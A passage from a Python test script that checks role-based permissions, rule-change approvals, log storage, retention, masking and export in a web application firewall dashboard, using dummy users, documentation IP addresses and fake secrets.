    check("画面: 組織の管理は管理者だけ", st_ == 403 and get(p2, "/api/orgs", headers=H["adm"])[0] == 200)
    st_, body_, _ = get(p2, "/api/security", headers=H["anx"])
    sj = json.loads(body_)
    check("画面: アナリストのセキュリティ情報は担当範囲だけ", sj.get("limited") and [b["id"] for b in sj["backends"]] == ["bk-b"])
    # 申請とアナリストの対応
    st_, body_, _ = get(p2, "/api/tickets", "POST", json.dumps({"kind": "false_positive", "backend": "bk-b", "subject": "誤検知です"}), H["enb"])
    tid = json.loads(body_)["ticket"]["id"]
    st_, body_, _ = get(p2, "/api/tickets", "POST", json.dumps({"kind": "inquiry", "backend": "bk-a", "subject": "x"}), H["enb"])
    check("申請: 他社のバックエンドへは出せない", st_ == 403)
    tl = lambda u: [t["id"] for t in json.loads(get(p2, "/api/tickets", headers=H[u])[1])["tickets"]]
    check("申請: 担当アナリストには見え、担当外には見えない", tid in tl("anx") and tid not in tl("an0") and tid not in tl("dra") and tid in tl("adm"))
    rb = lambda u, d: get(p2, "/api/backend-rules", "POST", json.dumps(d), H[u])
    check("アナリスト: 申請番号なしの除外追加は拒否", rb("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/x", "minutes": 60})[0] == 403)
    check("アナリスト: 検知のみ・遮断への切り替えは申請番号なしでできる", rb("anx", {"backend": "bk-b", "op": "detect", "rule": "SQLI-004"})[0] == 200 and rb("anx", {"backend": "bk-b", "op": "block", "rule": "SQLI-004"})[0] == 200)
    check("アナリスト: 担当外のバックエンドは変更できない", rb("anx", {"backend": "bk-a", "op": "detect", "rule": "SQLI-001", "ticket": tid})[0] == 403)
    check("アナリスト: 全ルール(*)の除外は期限が必須", rb("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "*", "ticket": tid})[0] == 403)
    st_, body_, _ = rb("anx", {"backend": "bk-b", "op": "detect", "rule": "SQLI-001", "ticket": tid})
    check("アナリスト: 申請に紐づけて担当範囲の設定を変更できる(他社の設定は返さない)",
          st_ == 200 and [b["id"] for b in json.loads(body_)["backends"]] == ["bk-b"])
    check("一般ユーザーはルール設定を変更できない", rb("enb", {"backend": "bk-b", "op": "detect", "rule": "SQLI-001", "ticket": tid})[0] == 403)
    # アナリスト: 遮断/検知は選べる。「使わない」は申請して管理者が承認すると反映
    check("アナリスト: 「使わない」は申請番号があっても直接はできない(403)", rb("anx", {"backend": "bk-b", "op": "disable", "rule": "SQLI-002", "ticket": tid})[0] == 403)
    check("アナリスト: 遮断に戻す・再び使う(強くする方向)は申請番号なしでできる",
          rb("anx", {"backend": "bk-b", "op": "block", "rule": "SQLI-001"})[0] == 200 and rb("anx", {"backend": "bk-b", "op": "enable", "rule": "SQLI-002"})[0] == 200)
    st_, body_, _ = get(p2, "/api/tickets", "POST", json.dumps({"kind": "rule_proposal", "backend": "bk-b", "subject": "SQLI-002を使わない設定の申請", "body": "誤検知が多い",
                                                              "proposal": {"op": "disable", "rule": "SQLI-002"}}), H["anx"])
    pt_ = json.loads(body_).get("ticket", {})
    check("アナリスト: 「使わない」設定を申請できる(提案つき)", st_ == 200 and (pt_.get("proposal") or {}).get("rule") == "SQLI-002")
    st_, _, _ = get(p2, "/api/tickets/status", "POST", json.dumps({"id": pt_.get("id"), "approve": {"disable": True}}), H["anx"])
    check("アナリスト: 「使わない」の申請を自分で承認することはできない(403)", st_ == 403)
    st_, body_, _ = get(p2, "/api/tickets/status", "POST", json.dumps({"id": pt_.get("id"), "approve": {"disable": True}}), H["adm"])
    dis_ = [b for b in json.loads(get(p2, "/api/backend-rules", headers=H["adm"])[1])["backends"] if b["id"] == "bk-b"][0]["rule_disabled"]
    check("管理者: 申請を承認すると、そのバックエンドでルールが使われなくなる", st_ == 200 and "SQLI-002" in dis_ and json.loads(body_)["ticket"]["status"] == "done")
    rb("adm", {"backend": "bk-a", "op": "detect", "rule": "SQLI-005"})
    hist_a = json.loads(get(p2, "/api/rule-history", headers=H["anx"])[1])["history"]
    hist_m = json.loads(get(p2, "/api/rule-history", headers=H["adm"])[1])["history"]
    check("変更履歴: アナリストには担当範囲のバックエンドの分だけ見える",
          hist_a and all(h.get("backend") == "bk-b" for h in hist_a) and any(h.get("rule") == "SQLI-002" for h in hist_a)
          and any(h.get("backend") == "bk-a" for h in hist_m))
    check("変更履歴: 一般ユーザーは見られない(403)", get(p2, "/api/rule-history", headers=H["enb"])[0] == 403)
    check("アナリスト: パス別の「使わない」は直接できない(403)", rb("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/x", "minutes": 60, "mode": "off"})[0] == 403)
    check("アナリスト: パス別の「検知のみ」は申請なしでできる", rb("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/x", "minutes": 60, "mode": "detect"})[0] == 200)
    check("アナリスト: 全ルール(*)のパス別設定は期限が必須", rb("anx", {"backend": "bk-b", "op": "add_exclusion", "rule": "*", "path_prefix": "/x", "mode": "detect"})[0] == 403)
    ex_ = [e for e in json.loads(get(p2, "/api/backend-rules", headers=H["anx"])[1])["backends"][0]["exclusions"] if e["path_prefix"] == "/x"]
    check("アナリスト: パス別の設定を削除できる", ex_ and rb("anx", {"backend": "bk-b", "op": "remove_exclusion", "exclusion": ex_[0]["id"]})[0] == 200)
    st_, body_, _ = get(p2, "/api/tickets", "POST", json.dumps({"kind": "rule_proposal", "backend": "bk-b", "subject": "パスで使わない申請", "body": "x",
                                                              "proposal": {"op": "exclude", "rule": "SQLI-003", "path_prefix": "/ed", "minutes": 1440}}), H["anx"])
    xt_ = json.loads(body_)["ticket"]
    check("アナリスト: パス別の「使わない」を申請できる(提案つき)", st_ == 200 and xt_["proposal"].get("path_prefix") == "/ed")
    get(p2, "/api/tickets/status", "POST", json.dumps({"id": xt_["id"], "approve": {"apply": True}}), H["adm"])
    exm_ = [e for e in [b for b in json.loads(get(p2, "/api/backend-rules", headers=H["adm"])[1])["backends"] if b["id"] == "bk-b"][0]["exclusions"] if e["rule"] == "SQLI-003"]
    check("管理者: 申請を承認すると、そのパスでルールが使われなくなる(使わない)", exm_ and exm_[0]["mode"] == "off" and exm_[0]["path_prefix"] == "/ed")
    st_, _, _ = get(p2, "/api/tickets/status", "POST", json.dumps({"id": tid, "approve": {"rule": "SQLI-001", "path_prefix": "/ed", "minutes": 60, "mode": "off"}}), H["anx"])
    check("アナリスト: 申請の承認で「そのパスでは使わない」にはできない(403)", st_ == 403)
    st_, body_, _ = get(p2, "/api/tickets/status", "POST", json.dumps({"id": tid, "approve": {"rule": "SQLI-001", "path_prefix": "/ed", "minutes": 60, "mode": "detect"}}), H["anx"])
    check("アナリスト: 申請を承認して、そのパスでは検知のみにできる(申請番号を記録)", st_ == 200 and json.loads(body_)["ticket"]["status"] == "done")
    st_, _, _ = get(p2, "/api/tickets/status", "POST", json.dumps({"id": tid, "status": "done"}), H["an0"])
    check("アナリスト: 担当外の申請は操作できない", st_ == 403)
    check("アナリスト: 共通のBANは管理者だけ", get(p2, "/api/security/ban", "POST", json.dumps({"ip": "203.0.113.9", "minutes": 10}), H["anx"])[0] == 403)
    check("アナリスト: 担当外の防御モードは変更できない",
          get(p2, "/api/security/bemode", "POST", json.dumps({"backend": "bk-a", "mode": "detect", "ticket": tid}), H["anx"])[0] == 403)
    check("管理者: 組織の追加・割り当て・書き出し",
          get(p2, "/api/orgs", "POST", json.dumps({"op": "add_org", "id": "n1", "type": "direct"}), H["adm"])[0] == 200
          and get(p2, "/api/orgs", "POST", json.dumps({"op": "assign_backend", "backend": "bk-n", "org": "n1"}), H["adm"])[0] == 200
          and get(p2, "/api/orgs/export", "POST", json.dumps({"org": "n1"}), H["adm"])[0] == 200)
    # 接続先は組織に紐づく。一般が追加すると自分の組織になり、他組織のものは触れない
    st_, body_, _ = get(p2, "/api/config", headers=H["enb"])
    cfg_enb = json.loads(body_)
    profs_ = cfg_enb["editable"]["backend"]["profiles"]
    check("接続先: 一般が見る設定は所属組織のものだけ", [x["id"] for x in profs_] == ["bk-b"])
    newp = {"id": "tmp-1", "name": "B社の新サイト", "scheme": "http", "host": "127.0.0.1", "port": 9, "org": "b"}
    st_, body_, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": profs_ + [newp]}}), H["enb"])
    with open(cfgp2, encoding="utf-8") as f:
        saved_ = json.load(f)
    check("接続先: 一般ユーザーは追加できない", st_ == 403 and not [p for p in saved_["backends"] if p.get("name") == "B社の新サイト"])
    dup_ = dict(profs_[0])
    st_, _, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": profs_ + [dup_]}}), H["enb"])
    with open(cfgp2, encoding="utf-8") as f:
        saved2_ = json.load(f)
    check("接続先: 同じidを重ねて送る「複製」でも、一般ユーザーは追加できない", st_ == 403 and len(saved2_["backends"]) == len(saved_["backends"]))
    st_, _, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": [{"id": "bk-a", "name": "x", "scheme": "http", "host": "127.0.0.1", "port": 9}]}}), H["enb"])
    check("接続先: 他の組織の接続先は変更できない", st_ == 403)
    # 一般ユーザーは防御モード・稼働停止/編集/削除・IPブロック設定を変更できない(閲覧のみ)。アナリストは変更できる
    mine_b = [dict(p) for p in profs_]
    stopped_b = [dict(mine_b[0], stopped=True)]
    check("一般ユーザー: 稼働停止・編集(403)", get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": stopped_b}}), H["enb"])[0] == 403)
    check("一般ユーザー: 削除(403)", get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": []}}), H["enb"])[0] == 403)
    check("一般ユーザー: 防御モードの変更は不可(403)", get(p2, "/api/security/bemode", "POST", json.dumps({"backend": "bk-b", "mode": "detect"}), H["enb"])[0] == 403)
    check("一般ユーザー: IP/国のブロック追加・解除は不可(403)",
          get(p2, "/api/security/bepolicy", "POST", json.dumps({"backend": "bk-b", "kind": "blocklist", "op": "add", "value": "203.0.113.50"}), H["enb"])[0] == 403
          and get(p2, "/api/security/bepolicy", "POST", json.dumps({"backend": "bk-b", "kind": "country_blocklist", "op": "add", "value": "CN"}), H["enb"])[0] == 403
          and get(p2, "/api/security/bepolicy", "POST", json.dumps({"backend": "bk-b", "kind": "blocklist", "op": "remove", "value": "203.0.113.50"}), H["enb"])[0] == 403)
    check("一般ユーザー: 共通のBAN操作も不可(403)", get(p2, "/api/security/ban", "POST", json.dumps({"ip": "203.0.113.9", "minutes": 10}), H["enb"])[0] == 403)
    check("アナリスト: IPブロックの変更は権限エラー(403)にならない(担当範囲のバックエンド)",
          get(p2, "/api/security/bepolicy", "POST", json.dumps({"backend": "bk-b", "kind": "blocklist", "op": "add", "value": "203.0.113.50"}), H["anx"])[0] != 403
          and get(p2, "/api/security/bepolicy", "POST", json.dumps({"backend": "bk-a", "kind": "blocklist", "op": "add", "value": "203.0.113.50"}), H["anx"])[0] == 403)
    sj_u = json.loads(get(p2, "/api/security", headers=H["enb"])[1])
    sj_a = json.loads(get(p2, "/api/security", headers=H["anx"])[1])
    check("BAN状況・ブロック状況: アナリストも一般ユーザーも閲覧できる(自分のバックエンドの分)",
          "bans" in sj_u and "bans" in sj_a and [b["id"] for b in sj_u["backends"]] == ["bk-b"] and "bk-b" in sj_u["backend_policies"] and "bk-b" in sj_a["backend_policies"])
    check("画面: 一般ユーザーは防御モード・稼働停止/編集/削除・ブロック追加を出さない(読み取り専用)",
          "AUTH.guser" in dashboard.PAGE and "body.guser #page-ip .ipform" in dashboard.PAGE and "変更は管理者・アナリストに依頼してください" in dashboard.PAGE
          and "ip-ban" in dashboard.PAGE)
    # ルール画面: 組織、バックエンドの順に選ぶ(管理者・アナリストのみ)
    st_, body_, _ = get(p2, "/api/backend-rules", headers=H["anx"])
    br_ = json.loads(body_)
    check("ルール画面: アナリストには担当範囲の組織とバックエンド(組織つき)だけ返る",
          st_ == 200 and {o["id"] for o in br_["orgs"]} == {"x", "b"} and [b["id"] for b in br_["backends"]] == ["bk-b"] and br_["backends"][0]["org"] == "b")
    st_, body_, _ = get(p2, "/api/backend-rules", headers=H["adm"])
    check("ルール画面: 管理者にはすべての組織が返る", st_ == 200 and len(json.loads(body_)["orgs"]) >= 3)
    st_, body_, _ = get(p2, "/api/rules/catalog", headers=H["anx"])
    cat_ = json.loads(body_)
    check("ルール一覧(参照用): アナリストも取得できるが、全体のON/OFF状態は含まない",
          st_ == 200 and cat_["rules"] and "enabled" not in cat_["rules"][0] and "id" in cat_["rules"][0])
    check("ルール一覧(参照用): 一般ユーザーは不可(403)", get(p2, "/api/rules/catalog", headers=H["enb"])[0] == 403)
    check("ルール画面: 全体のルール管理(/api/rules)はアナリストに開かない", get(p2, "/api/rules", headers=H["anx"])[0] == 403)
    page_ = get(p2, "/", headers=H["adm"])[1]
    page_ = page_.decode("utf-8") if isinstance(page_, bytes) else page_
    check("画面: 申請の一覧が自動更新(状態の変化を反映)・バックエンド編集の決定/キャンセルが画面に付いてくる",
          "function tkPoll" in page_ and "setInterval(tkPoll" in page_ and "position:sticky;bottom:58px" in page_ and "function beFocusEditor" in page_)
    check("ルール画面: 4つのタブと、組織→バックエンドの選択がある",
          all(k in page_ for k in ('id="hr-org"', 'id="hr-be"', 'function berReqSend', 'data-rt="be"', 'data-rt="global"', 'data-rt="custom"', 'data-rt="hist"', 'id="ber-org"', 'id="ber-be"', "function beRuleSet")))
    # アナリスト(SOC): 担当範囲の組織にだけバックエンドを追加できる。設定画面にはそれ以外の項目を出さない
    st_, body_, _ = get(p2, "/api/config", headers=H["anx"])
    cfg_anx = json.loads(body_)
    check("SOC設定: 見える設定はバックエンドだけ(通知・追加防御は含めない)",
          st_ == 200 and cfg_anx.get("analyst") and "extra" not in cfg_anx["editable"] and "notify_email" not in cfg_anx["editable"]
          and {o["id"] for o in cfg_anx["scope_orgs"]} == {"x", "b"})
    aprofs = cfg_anx["editable"]["backend"]["profiles"]
    st_, _, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": aprofs + [{"id": "tmp-1", "name": "SOC追加", "scheme": "http", "host": "127.0.0.1", "port": 9, "org": "a"}]}}), H["anx"])
    check("SOC設定: 担当外の組織には追加できない", st_ == 403)
    st_, _, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": aprofs + [{"id": "tmp-1", "name": "SOC追加", "scheme": "http", "host": "127.0.0.1", "port": 9}]}}), H["anx"])
    check("SOC設定: 組織を指定しない追加は拒否", st_ == 403)
    st_, body_, _ = get(p2, "/api/config", "POST", json.dumps({"backend": {"profiles": aprofs + [{"id": "tmp-1", "name": "SOC追加", "scheme": "http", "host": "127.0.0.1", "port": 9, "org": "b"}]}}), H["anx"])
    with open(cfgp2, encoding="utf-8") as f:
        saved_a = json.load(f)
    added = [p for p in saved_a["backends"] if p.get("name") == "SOC追加"]
    check("SOC設定: 担当範囲の組織には追加でき、その組織に紐づく", st_ == 200 and len(added) == 1 and added[0].get("org") == "b")
    st_, body_, _ = get(p2, "/api/config", headers=H["anx"])
    check("SOC設定: 追加したバックエンドが担当範囲に見える", added and added[0]["id"] in [p["id"] for p in json.loads(body_)["editable"]["backend"]["profiles"]])
    st_, _, _ = get(p2, "/api/config", "POST", json.dumps({"mode": "detect", "backend": {"profiles": aprofs}}), H["anx"])
    with open(cfgp2, encoding="utf-8") as f:
        saved_b = json.load(f)
    check("SOC設定: 動作モード等の他の設定は送っても変わらない", saved_b.get("mode") == saved_a.get("mode"))
    st_, body_, _ = get(p2, "/api/orgs", "POST", json.dumps({"op": "update_org", "id": "n1", "name": "新名称", "type": "direct", "parent": ""}), H["adm"])
    check("組織: 名前・種類を編集できる", st_ == 200 and any(o["id"] == "n1" and o["name"] == "新名称" for o in json.loads(body_)["orgs"]))
    st_, _, _ = get(p2, "/api/orgs", "POST", json.dumps({"op": "update_org", "id": "n1", "type": "enduser", "parent": ""}), H["adm"])
    check("組織: エンドユーザーを親なしにはできない", st_ != 200)
    check("画面: 設定に『組織登録編集』タブがあり、ルール画面には組織カードがない",
          "['org','組織登録編集']" in dashboard.PAGE and 'id="orgCard"' not in dashboard.PAGE and 'id="orgBody"' in dashboard.PAGE)
    check("画面: 組織管理UI・パス別設定の追加がある",
          "function renderOrgs" in dashboard.PAGE and "function renderOrgs" in dashboard.PAGE and "beExAdd" in dashboard.PAGE and 'data-ac="org"' in dashboard.PAGE)

    # =========================================================================
    # [16] ログ構成: WEBごとの日次ログ / 攻撃のまとめ / 保存期間 / 変換 / 読み込み / 書き出し(一般は不可)
    # =========================================================================
    import datetime as _dt
    import waf_logstore as wl
    print("\n[16] ログ構成(WEB別の日次ログ・上位ごとのまとめ _all・書き出し)")
    L_orgs = [dict(o, mask_analyst=True) for o in _nov(wo.normalize_orgs([
        {"id": "a", "type": "direct", "name": "A社"},
        {"id": "x", "type": "intermediary", "name": "X社"},
        {"id": "b", "type": "enduser", "parent": "x"}]))]
    L_profs = [dict(id="bk-a", name="A社サイト", scheme="http", host="127.0.0.1", port=9, org="a"),
               dict(id="bk-b", name="B社サイト", scheme="http", host="127.0.0.1", port=9, org="b"),
               dict(id="bk-n", name="未割当", scheme="http", host="127.0.0.1", port=9)]
    L_users = [{"username": "adm", "role": "admin", "password_hash": wx.hash_password("Adm!Passw0rd")},
               {"username": "anx", "role": "analyst", "scope": ["x"], "password_hash": wx.hash_password("Anx!Passw0rd")},
               {"username": "enb", "role": "user", "org": "b", "password_hash": wx.hash_password("Enb!Passw0rd")},
               {"username": "dra", "role": "user", "org": "a", "password_hash": wx.hash_password("Dra!Passw0rd")}]
    L_cfg = {"orgs": L_orgs, "backends": L_profs, "dashboard": {"users": L_users}, "active_backend": "bk-a",
             "listen_host": "127.0.0.1", "listen_port": 18081}
    root16 = os.path.join(TMP, "logs16")
    ls = wl.LogStore(root16, lambda: (L_cfg["orgs"], L_cfg["backends"], L_cfg["dashboard"]["users"]), ttl=0)
    today = _dt.date.today().isoformat()
    tsn = time.strftime("%Y-%m-%dT%H:%M:%S")
    rq = lambda ip: {"query": "password=hunter2&q=1", "headers": {"Cookie": "sid=zzz", "User-Agent": "UA"}, "body_len": 0}
    for b, act in (("bk-b", "PASS"), ("bk-b", "BLOCK"), ("bk-a", "PASS"), ("bk-a", "DETECT"), ("bk-n", "BLOCK"), ("", "ERROR")):
        ls.write({"ts": tsn, "action": act, "backend": b, "method": "GET", "path": "/p", "client_ip": "203.0.113.9", "req": rq(b)})
    ex = lambda p: os.path.exists(os.path.join(root16, *p.split("/"), today + ".log"))
    cnt_lines = lambda p: sum(1 for _ in open(os.path.join(root16, *p.split("/"), today + ".log"), encoding="utf-8"))
    check("ログ構成: WEBの個別ログは 組織/WEB/日付.log(通過も入る)", cnt_lines("x/b/bk-b") == 2 and cnt_lines("a/bk-a") == 2)
    check("ログ構成: ログすべて(通過も)が、所属組織・上位の組織・提供元の _all にもまとまる",
          cnt_lines("x/b/_all") == 2 and cnt_lines("x/_all") == 2 and cnt_lines("a/_all") == 2 and cnt_lines("_all") == 5)
    check("ログ構成: 組織に属さないWEBは _unassigned、WEBに属さない記録は _system", cnt_lines("_unassigned/bk-n") == 1 and cnt_lines("_system") == 1)
    check("ログ構成: 他の組織のまとめには入らない(A社のまとめにB社の行はない)",
          "bk-b" not in open(os.path.join(root16, "a", "_all", today + ".log"), encoding="utf-8").read())
    # まとめの作り直し
    import shutil as _sh
    _sh.rmtree(os.path.join(root16, "x", "_all"))
    ls.close_all()
    ls.rebuild_rollups()
    check("ログ構成: まとめが壊れても個別ログから作り直せる", cnt_lines("x/_all") == 2 and cnt_lines("_all") == 5 and cnt_lines("x/b/bk-b") == 2)
    # WEBを別の組織へ移す。過去ログは元に残り、読むときは両方見える
    L_cfg["backends"][1]["org"] = "a"
    ls.invalidate()
    ls.write({"ts": tsn, "action": "BLOCK", "backend": "bk-b", "method": "GET", "path": "/after", "client_ip": "203.0.113.9"})
    check("ログ構成: WEBを移した後の攻撃は新しい組織へ、過去ログは元の組織に残る",
          cnt_lines("a/bk-b") == 1 and cnt_lines("x/b/bk-b") == 2 and cnt_lines("x/b/_all") == 2 and cnt_lines("a/_all") == 3)
    check("ログ構成: 読み込みは移す前の分も含める", len(list(ls.read_backend("bk-b"))) == 3)
    check("ログ構成: 画面が読む元の記録に、まとめ(_all)は含まれない(二重に数えない)",
          all("_all" not in os.path.relpath(f, root16).split(os.sep) for fs in ls.web_dirs().values() for f in fs))
    L_cfg["backends"][1]["org"] = "b"
    ls.invalidate()
    # 保存期間: 古い日付のファイルを消す(個別30日・攻撃180日・未割り当ては消さない)
    old = lambda d: (_dt.date.today() - _dt.timedelta(days=d)).isoformat()
    for p, d in (("x/b/bk-b", 40), ("x/b/bk-b", 5), ("x/b/_all", 100), ("x/b/_all", 200), ("_unassigned/bk-n", 400), ("_all", 200), ("_all", 100), ("x/b/_all", 5)):
        fp = os.path.join(root16, *p.split("/"), old(d) + ".log")
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        with open(fp, "w", encoding="utf-8") as f:
            f.write(json.dumps({"ts": old(d) + "T00:00:00", "action": "BLOCK", "backend": "bk-b"}) + "\n")
            if p.endswith("_all"):
                f.write(json.dumps({"ts": old(d) + "T00:00:01", "action": "PASS", "backend": "bk-b"}) + "\n")
    n_rm = ls.prune()
    left_ = lambda p: sorted(os.listdir(os.path.join(root16, *p.split("/"))))
    rd_ = lambda p, d: [json.loads(x)["action"] for x in open(os.path.join(root16, *p.split("/"), old(d) + ".log"), encoding="utf-8")]
    check("保存期間: 個別ログは30日で消える", old(40) + ".log" not in left_("x/b/bk-b") and old(5) + ".log" in left_("x/b/bk-b"))
    check("保存期間: まとめ(_all)は、30日を過ぎたら攻撃の行だけに絞り、180日で消える",
          rd_("x/b/_all", 100) == ["BLOCK"] and old(200) + ".log" not in left_("x/b/_all") and rd_("x/b/_all", 5) == ["BLOCK", "PASS"]
          and old(200) + ".log" not in left_("_all") and rd_("_all", 100) == ["BLOCK"])
    check("保存期間: 組織に属さないWEBのログは消さない", old(400) + ".log" in left_("_unassigned/bk-n") and n_rm >= 5)
    L_orgs2 = [dict(o) for o in L_orgs]
    L_orgs2[2]["retention_days"] = 60
    L_orgs2[2]["retention_attack_days"] = 400
    L_cfg["orgs"] = L_orgs2
    ls.invalidate()
    check("保存期間: 管理画面で組織ごとに変えられる(個別60日・攻撃400日)",
          wo.retention_for(L_orgs2, L_profs[1]) == 60 and wo.attack_retention_for(L_orgs2, "b") == 400 and wo.attack_retention_for(L_orgs2, "a") == 180)
    L_cfg["orgs"] = L_orgs
    ls.invalidate()
    # 既存 waf.log の一度きりの変換
    legacy = os.path.join(TMP, "legacy_waf.log")
    root_m = os.path.join(TMP, "logs_mig")
    lsm = wl.LogStore(root_m, lambda: (L_cfg["orgs"], L_cfg["backends"], L_cfg["dashboard"]["users"]), ttl=0)
    with open(legacy, "w", encoding="utf-8") as f:
        for b, act in (("bk-b", "PASS"), ("bk-b", "BLOCK"), ("bk-a", "BLOCK")):
            f.write(json.dumps({"ts": tsn, "action": act, "backend": b}) + "\n")
    m1 = lsm.migrate_legacy(legacy)
    m2 = lsm.migrate_legacy(legacy)
    check("変換: waf.log を新しい構成へ一度だけ変換し、元は .migrated にする",
          m1 == 3 and m2 == 0 and not os.path.exists(legacy) and os.path.exists(legacy + ".migrated")
          and sum(1 for _ in open(os.path.join(root_m, "x", "b", "_all", today + ".log"), encoding="utf-8")) == 2)

    # 旧構成(attacks/)からの移行
    root_u = os.path.join(TMP, "logs_upg")
    lsu = wl.LogStore(root_u, lambda: (L_cfg["orgs"], L_cfg["backends"], L_cfg["dashboard"]["users"]), ttl=0)
    for b, act in (("bk-b", "PASS"), ("bk-b", "BLOCK")):
        lsu.write({"ts": tsn, "action": act, "backend": b})
    for d in (os.path.join(root_u, "x", "attacks"), os.path.join(root_u, "_all", "attacks")):
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, today + ".log"), "w", encoding="utf-8") as f:
            f.write(json.dumps({"ts": tsn, "action": "BLOCK", "backend": "bk-b"}) + "\n")
    lsu.close_all()
    n_up = lsu.upgrade_layout()
    check("移行: 旧い attacks/ を消して、_all を個別ログから作り直す(二重に読まない)",
          n_up == 6 and not os.path.exists(os.path.join(root_u, "x", "attacks")) and not os.path.exists(os.path.join(root_u, "_all", "attacks"))
          and sum(1 for _ in open(os.path.join(root_u, "x", "_all", today + ".log"), encoding="utf-8")) == 2
          and len(list(lsu.read_backend("bk-b"))) == 2 and lsu.upgrade_layout() == 0)

    # 画面(HTTP): 新構成から読む / 範囲 / マスク / 書き出しの権限
    cfgp16 = os.path.join(TMP, "cfg16.json")
    with open(cfgp16, "w", encoding="utf-8") as f:
        json.dump(L_cfg, f)
    ctl16 = dashboard.FileConfigControl(cfgp16)
    dh16 = dashboard.make_handler(os.path.join(TMP, "unused16.log"), dashboard.GeoResolver(enabled=False, egress=False), control=ctl16, source=ls)
    ds16 = ThreadingHTTPServer(("127.0.0.1", free_port()), dh16)
    threading.Thread(target=ds16.serve_forever, daemon=True).start()
    p16 = ds16.server_address[1]

    def login16(u, pw):
        st_, _, hd_ = get(p16, "/login", "POST", f"username={u}&password={pw}".encode(), {"Content-Type": "application/x-www-form-urlencoded"})
        return {"Cookie": (hd_.get("Set-Cookie") or "").split(";")[0], "Content-Type": "application/json"}
    H16 = {u: login16(u, pw) for u, pw in (("adm", "Adm!Passw0rd"), ("anx", "Anx!Passw0rd"), ("enb", "Enb!Passw0rd"), ("dra", "Dra!Passw0rd"))}
    evs16 = lambda u: json.loads(get(p16, "/api/events?limit=500", headers=H16[u])[1]).get("events", [])
    adm_rows = evs16("adm")
    check("画面(日次ログ): 管理者は全部(通過・システムを含む)", len(adm_rows) >= 8 and any(r["action"] == "PASS" for r in adm_rows))
    anx_rows = evs16("anx")
    anx_txt = json.dumps(anx_rows, ensure_ascii=False)
    check("画面(日次ログ): 中間企業のアナリストは配下のWEBだけ・通過も見え、機微情報は伏せる",
          anx_rows and {r["backend"] for r in anx_rows} == {"bk-b"} and any(r["action"] == "PASS" for r in anx_rows)
          and "hunter2" not in anx_txt and "zzz" not in anx_txt and "***" in anx_txt)
    check("画面(日次ログ): 一般ユーザーは自社のWEBだけ", {r["backend"] for r in evs16("enb")} == {"bk-b"} and {r["backend"] for r in evs16("dra")} == {"bk-a"})
    st_, body_, _ = get(p16, "/api/stats", headers=H16["anx"])
    check("画面(日次ログ): アナリストの集計にも秘密は出ない", st_ == 200 and "hunter2" not in body_.decode("utf-8", "replace") and "zzz" not in body_.decode("utf-8", "replace"))
    # 書き出し
    st_, body_, _ = get(p16, "/api/logs/export?format=csv", headers=H16["enb"])
    check("書き出し: 一般ユーザーは不可(403)", st_ == 403)
    st_, body_, hd_ = get(p16, "/api/logs/export?format=jsonl", headers=H16["anx"])
    txt_ = body_.decode("utf-8", "replace")
    check("書き出し: アナリストは担当範囲だけ・マスクつき", st_ == 200 and '"bk-b"' in txt_ and "bk-a" not in txt_ and "bk-n" not in txt_
          and "hunter2" not in txt_ and "zzz" not in txt_ and hd_.get("X-Truncated") == "0")
    st_, _, _ = get(p16, "/api/logs/export?backend=bk-a", headers=H16["anx"])
    check("書き出し: 担当範囲の外のWEBは指定できない(403)", st_ == 403)
    st_, body_, _ = get(p16, "/api/logs/export?attacks_only=1&format=csv", headers=H16["anx"])
    t2 = body_.decode("utf-8-sig", "replace")
    check("書き出し: 攻撃のみ(担当組織のまとめログから)・CSV", st_ == 200 and "BLOCK" in t2 and "PASS" not in t2 and "bk-a" not in t2)
    st_, body_, _ = get(p16, "/api/logs/export?format=jsonl", headers=H16["adm"])
    check("書き出し: 管理者はマスクなしで全部", st_ == 200 and "hunter2" in body_.decode("utf-8", "replace"))
    st_, _, _ = get(p16, "/api/logs/export?from=2026-1-1", headers=H16["adm"])
    check("書き出し: 期間の形式が不正なら400", st_ == 400)
    body_c, n_c, trunc_c, _f = ls.export(["bk-a", "bk-b"], cap=2)
    check("書き出し: 行数の上限を超えたら打ち切る", n_c == 2 and trunc_c is True)
    st_, body_, _ = get(p16, "/api/rule-history", headers=H16["adm"])
    hist_ = json.loads(body_).get("history", []) if st_ == 200 else []
    check("書き出し: 誰が・何行書き出したかが変更履歴に残る",
          any(h.get("kind") == "log_export" and h.get("by") == "anx" for h in hist_) and any(h.get("kind") == "log_export" and h.get("by") == "adm" for h in hist_))
    # リアルタイム配信(新構成から)
    c_ = http.client.HTTPConnection("127.0.0.1", p16, timeout=8)
    c_.request("GET", "/api/stream", headers={"Cookie": H16["anx"]["Cookie"]})
    r_ = c_.getresponse()

    def _later():
        time.sleep(1.5)
        ls.write({"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "action": "PASS", "backend": "bk-b", "method": "GET", "path": "/live-new", "client_ip": "203.0.113.9", "req": rq("")})
    threading.Thread(target=_later, daemon=True).start()
    buf_, t0_ = b"", time.time()
    try:
        while time.time() - t0_ < 6 and b"/live-new" not in buf_:
            ch_ = r_.read1(4096)
            if not ch_:
                break
            buf_ += ch_
    except Exception:
        pass
    c_.close()
    t3 = buf_.decode("utf-8", "replace")
    check("リアルタイム配信: 新しい構成の追記も届き、アナリストには伏せる", "/live-new" in t3 and "hunter2" not in t3 and "zzz" not in t3)
    # ログ削除は管理者だけ(一般・アナリストは403)
    for u_ in ("anx", "an0", "enb"):
        if u_ in H16:
            check(f"ログ削除: {u_} は不可(403)", get(p16, "/api/logs/delete", "POST", json.dumps({"backend": "bk-b"}), H16[u_])[0] == 403)
    # ログ削除(WEBごと)
    st_, body_, _ = get(p16, "/api/logs/delete", "POST", json.dumps({"backend": "bk-a"}), H16["adm"])
    ls.close_all()
    check("ログ削除: そのWEBの個別ログと、まとめの中の分が消える",
